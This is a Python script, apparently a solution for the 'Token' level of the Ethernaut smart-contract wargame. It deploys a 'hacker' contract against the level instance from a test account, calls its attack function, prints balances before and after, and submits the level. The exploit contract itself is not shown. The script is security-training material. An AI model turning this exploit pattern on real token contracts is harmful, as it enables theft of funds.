from ape import accounts, project
from ..utils.helper import get_level_instance, level_completed

ETHERNAUT = "0xD2e5e0102E55a5234379DD796b8c641cd5996Efd"
LEVEL = "0xB4802b28895ec64406e45dB504149bfE79A38A57"


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    # deploy hacker contract
    print("\n--- Deploying hacker contract ---\n")
    hacker = project.Token.deploy(instance, sender=user)

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")

    print(
        f"\n--- Our balance before the exploit: {hacker.instanceBalanceOf(user)} ---\n"
    )
    print(
        f"\n--- Our contract's balance before exploit: {hacker.instanceBalanceOf(hacker)} ---\n"
    )
    hacker.attack(sender=user)
    print(
        f"\n--- Our balance after the exploit: {hacker.instanceBalanceOf(user)} ---\n"
    )
    print(
        f"\n--- Our contract's balance after before exploit: {hacker.instanceBalanceOf(hacker)} ---\n"
    )

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
